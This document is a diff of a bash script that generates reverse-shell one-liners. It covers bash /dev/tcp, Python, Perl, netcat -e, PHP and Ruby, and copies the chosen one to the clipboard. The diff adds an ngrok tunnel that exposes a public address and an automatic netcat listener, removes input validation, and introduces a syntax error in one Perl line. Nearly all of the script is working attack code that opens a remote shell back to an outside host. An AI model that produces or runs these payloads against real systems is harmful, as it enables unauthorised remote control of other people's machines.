@@ -1,19 +1,26 @@
 #!/bin/bash
 
-#List of prerewuisite tools
-required_tools=("lolcat" "toilet" "xclip")
+#List of prerequisite tools
+required_tools=("lolcat" "toilet" "xclip" "ngrok" "netcat")
 
 #Function to check if a tool is installed
 check_tool(){
   command -v "$1" >/dev/null 2>&1
 }
+package_manager=""
+
+# Read package manager only once
+
 
 #Function to download and install a tool
 install_tool() {
     tool_name="$1"
-    
-    read -p "Enter your package manager (apt, dnf, pacman, yum): " package_manager
 
+    if [ -z "$package_manager" ]; then
+        echo "No package manager is set. Please enter your package manager (apt, dnf, pacman, yum):"
+        read package_manager
+    fi
+    
     case "$package_manager" in
         apt)
             download_command="sudo apt-get install -y $tool_name"
@@ -48,7 +55,6 @@ install_tool() {
 for tool in "${required_tools[@]}"; do
     if ! check_tool "$tool"; then
         install_tool "$tool"
-    
     fi
 done
 
@@ -67,52 +73,42 @@ while true; do
     local option="$1"
     local host="$2"
     local port="$3"
-    if [[ ! $host =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
-        echo -e "\e[1;31mInvalid IP address format. Please enter a valid IP address.\e[0m"
-        return
-    fi
-
-    # Validate port number
-    if [[ ! $port =~ ^[0-9]+$ ]] || [ $port -le 0 ] || [ $port -gt 65535 ]; then
-        echo -e "\e[1;31mInvalid port number. Please enter a valid port (1-65535).\e[0m"
-        return
-    fi
-
+    
     case "$option" in
       1)
         echo "bash -i >& /dev/tcp/$host/$port 0>&1" | lolcat
-	      echo "bash -i >& /dev/tcp/$host/$port 0>&1" | xclip -selection clipborad  
-        echo "Code copied to clipborad!!"
+        echo "bash -i >& /dev/tcp/$host/$port 0>&1" | xclip -selection clipboard  
+        echo "Code copied to clipboard!!"
         ;;
       2)
         echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$host\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" | lolcat   
-        echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$host\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" | xclip -selection clipborad  
-        echo "Code copied to clipborad!!"
+        echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$host\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" | xclip -selection clipboard  
+        echo "Code copied to clipboard!!"
         ;;
       3)
         echo "export RHOST=\"$host\";export RPORT=$port;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'" | lolcat 
-        echo "export RHOST=\"$host\";export RPORT=$port;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'" | xclip -selection clipborad 
-        echo "Code copied to clipborad!!"
+        echo "export RHOST=\"$host\";export RPORT=$port;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'" | xclip -selection clipboard 
+        echo "Code copied to clipboard!!"
         ;;
       4)
         echo "perl -e 'use Socket;\$i=\"$host\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" | lolcat 
-        echo "perl -e 'use Socket;\$i=\"$host\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" | xclip -selection clipborad 
-        echo "Code copied to clipborad!!"
+        echo "perl -e 'use Socket;\$i=\"$host\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\";exec(\"/bin/sh -i\");};'" | xclip -selection clipboard 
+        echo "Code copied to clipboard!!"
         ;;
       5)
         echo "nc -e /bin/sh $host $port" | lolcat 
-        echo "nc -e /bin/sh $host $port" | xclip -selection clipborad 
-        echo "Code copied to clipborad!!"
+        echo "nc -e /bin/sh $host $port" | xclip -selection clipboard 
+        echo "Code copied to clipboard!!"
         ;;
       6)
         echo "php -r '\$sock=fsockopen(\"$host\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" | lolcat 
-        echo "php -r '\$sock=fsockopen(\"$host\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" | xclip -selection clipborad 
-        echo "Code copied to clipborad!!"
+        echo "php -r '\$sock=fsockopen(\"$host\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" | xclip -selection clipboard 
+        echo "Code copied to clipboard!!"
         ;;
       7)
         echo "ruby -rsocket -e'f=TCPSocket.open(\"$host\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" | lolcat 
-        echo "ruby -rsocket -e'f=TCPSocket.open(\"$host\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" | xclip -selection clipborad 
-        echo "Code copied to clipborad!!"
+        echo "ruby -rsocket -e'f=TCPSocket.open(\"$host\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" | xclip -selection clipboard 
+        echo "Code copied to clipboard!!"
         ;;
     esac
   }
@@ -137,34 +133,46 @@ while true; do
     done
   }
 
-
-
   # Display the list in red
   display_list
   echo
 
   # Get user input for language
-
   while true; do
-    
     read_green "Choose an option:" option
     if [[ $option -ge 1 && $option -le 7 ]]; then
         break
     else
         echo -e "\e[1;31mInvalid option, please try again!!\e[0m"
     fi
-done
+  done
 
+  # Option to use ngrok for public IP
+  read -p "Do you want to use ngrok for public IP? (yes/no): " use_ngrok
+  if [[ "$use_ngrok" == "yes" ]]; then
+    read -p "Enter the port for ngrok to listen on: " ngrok_port
+    ngrok tcp $ngrok_port > /dev/null &
+    sleep 2
+    host=$(curl --silent http://127.0.0.1:4040/api/tunnels | grep -Po '"public_url":"tcp://\K[^"]*')
+    port=$(echo $host | cut -d':' -f2)
+    host=$(echo $host | cut -d':' -f1)
+    echo "Using ngrok, public IP: $host and port: $port"
+    generate_reverse_shell "$option" "$host" "$port"
+    echo "Setting up netcat listener on port $ngrok_port..."
+    nc -lvp $ngrok_port 
+    pkill ngrok
+  else
+    # Get user input for IP address
+    read_green "Enter the IP address: " host
 
+    # Get user input for port
+    read_green "Enter the port: " port
+    generate_reverse_shell "$option" "$host" "$port"
+    echo "Setting up netcat listener on port $port..."
+    nc -lvp $port 
+  fi
 
-
-  # Get user input for IP address
-  read_green "Enter the IP address: " host
-
-  # Get user input for port
-  read_green "Enter the port: " port
-
-  generate_reverse_shell "$option" "$host" "$port"
+  
 
   echo "Type 'exit' to close the tool, or press Enter to continue..."
   read input
